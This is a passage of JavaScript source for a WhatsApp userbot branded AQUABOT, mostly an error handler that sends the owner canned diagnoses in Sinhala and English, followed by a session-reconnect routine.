                                        '\n*හේතුව:* _IMG හෝ විකි විධානයන් භාවිතා කිරීම._' +
                                        '\n*විසඳුම:* _මෙම දෝෂයට විසඳුමක් නොමැත. එය ලොකු වරදක් නොවේ._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*♦︎✧දෝෂ විසඳුම (🐋AQUABOT 🐋)✧♦︎*' + 
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝෂය:* _පිළිතුර මකන්න කාර්යය_' +
                                        '\n*හේතුව:* _IMG හෝ විකි විධානයන් භාවිතා කිරීම._' +
                                        '\n*විසඳුම:* _මෙම දෝෂයට විසඳුමක් නොමැත. එය ලොකු වරදක් නොවේ._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*♦︎✧දෝෂ විසඳුම (🐋AQUABOT 🐋)✧♦︎*' + 
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝෂය:* _Bailyes Action Error_ ' +
                                        '\n*හේතුව:* _නිශ්චිත හේතුව නොදනී. විකල්ප කිහිපයක්ම මෙම දෝෂය ඇති කිරීමට හේතු වන්නට ඇත._' +
                                        '\n*විසඳුම:* _ඔබ එය තවත් වරක් භාවිතා කරන්නේ නම්, එය නිවැරදි කළ හැකිය. දෝෂය පවතින්නේ නම්, ඔබට නැවත ආරම්භ කිරීමට උත්සාහ කළ හැකිය.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*♦︎✧දෝෂ විසඳුම (🐋AQUABOT 🐋)✧♦︎*' + 
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝෂය:* _පෙළ හෝ මාධ්‍ය විකේතනය කළ නොහැක_' +
                                        '\n*හේතුව:* _Plugin වැරදි ලෙස භාවිතා කිරීම._' +
                                        '\n*විසඳුම:* _Plugin විස්තරයේ ලියා ඇති පරිදි කරුණාකර විධානයන් භාවිතා කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*♦︎✧දෝෂ විසඳුම (🐋AQUABOT 🐋)✧♦︎*' + 
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝෂය:* _Word Character Usage_' +
                                        '\n*හේතුව:* _ලතින් අකාරාදියෙන් TTP, ATTP වැනි විධානයන් භාවිතා කිරීම._' +
                                        '\n*විසඳුම:* _ඔබ ලතින් හෝඩියේ විධානය භාවිතා කළහොත් ගැටළුව විසඳනු ඇත._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*♦︎✧දෝෂ විසඳුම (🐋AQUABOT 🐋)✧♦︎*' + 
                                        '\n========== ```දෝෂය කියවන්න!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝෂය:* _Deleting Plugin_' +
                                        '\n*හේතුව:* _මැකීමට Plugin නම වැරදි ලෙස ඇතුළත් කිරීම._' +
                                        '\n*විසඳුම:* _කරුණාකර ඔබට මැකීමට අවශ්‍ය Plugin ආරම්භ කරන්න.a_ *__* _නැතිව උත්සාහ කරන්න. ඔබ තවමත් දෝෂය ලබා ගන්නේ නම්_ ```?(.*) / $``` _වැනි සම්පූර්ණ ප්‍රකාශන ඇතුළත් කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*🙇🏻 කණගාටුයි මට මෙම දෝෂය කියවීමට නොහැකි වුනා! 🙇🏻*' +
                                        '\n_වැඩිදුර උදව් සඳහා ඔබට අපේ කණ්ඩායමට ලිවිය හැකිය._'
                                        , MessageType.text
                                    );
                                }
                            }
                            else {
                                await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*-- ERROR REPORT [🐋AQUABOT 🐋] --*' + 
                                    '\n*COBRABOT an error has occurred!*'+
                                    '\n_This error log may include your number or the number of an opponent. Please be careful with it!_' +
                                    '\n_Aslo you can join our support group:_ https://chat.whatsapp.com/FgPh5cqjcw53qnAXQiBCK0' +
                                    '\n_This message should have gone to your number (saved messages)._\n\n' +
                                    '*Error:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: false}
                                );
                                if (error.message.includes('URL')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*⚕️ ERROR ANALYSIS [🐋AQUABOT 🐋] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Only Absolutely URLs Supported_' +
                                        '\n*Reason:* _The usage of media tools (xmedia, sticker..) in the LOG number._' +
                                        '\n*Solution:* _You can use commands in any chat, except the LOG number._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*⚕️ ERROR ANALYSIS [🐋AQUABOT 🐋] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Deleting Plugin_' +
                                        '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
                                        '\n*Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*⚕️ ERROR ANALYSIS [🐋AQUABOT 🐋] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Split of Undefined_' +
                                        '\n*Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
                                        '\n*Solution:* _Restarting will be enough._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*⚕️ ERROR ANALYSIS [🐋AQUABOT 🐋] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _SQL Database Error_' +
                                        '\n*Reason:* _Database corruption._ ' +
                                        '\n*Solution:* _There is no known solution. You can try reinstalling it._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*⚕️ ERROR ANALYSIS [🐋AQUABOT 🐋] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Ookla Server Connection_' +
                                        '\n*Reason:* _Speedtest data cannot be transmitted to the server._' +
                                        '\n*Solution:* _If you use it one more time the problem will be solved._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*⚕️ ERROR ANALYSIS [🐋AQUABOT 🐋] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Requested Audio Params_' +
                                        '\n*Reason:* _Using the TTS command outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin letters frame._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*⚕️ ERROR ANALYSIS [🐋AQUABOT 🐋] ⚕️*' + 
                                        '\n========== ```Error Resolved``` ==========' +
                                        '\n\n*Main Error:* _No Such File or Directory_' +
                                        '\n*Reason:* _Incorrect coding of the plugin._' +
                                        '\n*Solution:* _Please check the your plugin codes._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*⚕️ ERROR ANALYSIS [🐋AQUABOT 🐋] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Error 404 HTTPS_' +
                                        '\n*Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
                                        '\n*Solution:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*⚕️ ERROR ANALYSIS [🐋AQUABOT 🐋] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*⚕️ ERROR ANALYSIS [🐋AQUABOT 🐋] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*⚕️ ERROR ANALYSIS [🐋AQUABOT 🐋] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Bailyes Action Error_ ' +
                                        '\n*Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
                                        '\n*Solution:* _If you use it again, it may improve. If the error continues, you can try to restart._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*⚕️ ERROR ANALYSIS [🐋AQUABOT 🐋] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Cannot Decode Text or Media_' +
                                        '\n*Reason:* _Incorrect use of the plug._' +
                                        '\n*Solution:* _Please use the commands as written in the plugin description._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*⚕️ ERROR ANALYSIS [🐋AQUABOT 🐋] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Word Character Usage_' +
                                        '\n*Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin alphabet.._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*🙇🏻 Sorry, I Couldnt Read This Error! 🙇🏻*' +
                                        '\n_You can write to our support group for more help._'
                                        , MessageType.text
                                        )
                                    }                    
                                }
                            }
                       }
                    }
                }
            )
        });
    
    try {
        await cobrabotconn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('ඔබේ පැරණි අනුවාද මාලාව නැවුම් වෙමින් පවතී...'))
            cobrabotconn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await cobrabotconn.connect();
            } catch {
                return;
            }
        }
    }
}

aquabot();
